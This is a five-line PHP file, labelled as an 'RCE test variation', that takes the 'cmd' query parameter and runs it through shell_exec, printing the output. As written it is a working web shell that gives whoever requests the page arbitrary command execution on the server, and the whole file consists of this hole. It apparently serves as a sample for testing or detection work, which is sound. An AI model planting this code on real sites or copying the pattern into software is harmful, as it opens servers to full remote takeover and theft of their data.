<?php
// RCE test variation #929
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>